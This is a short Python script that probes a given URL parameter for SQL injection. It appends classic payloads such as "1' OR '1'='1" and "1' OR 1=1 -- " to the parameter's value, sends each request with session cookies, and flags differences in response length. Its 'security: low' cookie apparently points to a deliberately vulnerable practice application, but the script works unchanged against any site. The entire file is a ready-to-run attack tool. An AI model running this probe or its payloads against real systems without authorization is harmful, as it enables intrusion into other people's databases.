import requests
import sys

COOKIES = {'PHPSESSID': '你的值', 'security': 'low'}
payloads = ["'", '"', "1' OR '1'='1", "1' OR 1=1 -- ", "1' AND '1'='2", "1 AND 1=2"]

def test_injection(url, param, original_value):
    original_resp = requests.get(url, params={param: original_value}, cookies=COOKIES)
    original_len = len(original_resp.text)
    for payload in payloads:
        test_value = original_value + payload
        resp = requests.get(url, params={param: test_value}, cookies=COOKIES)
        if len(resp.text) != original_len:
            print(f"[!] Possible SQL injection: {param}={test_value}")
        else:
            print(f"[-] No difference: {param}={test_value}")

if __name__ == "__main__":
    test_injection(sys.argv[1], sys.argv[2], sys.argv[3])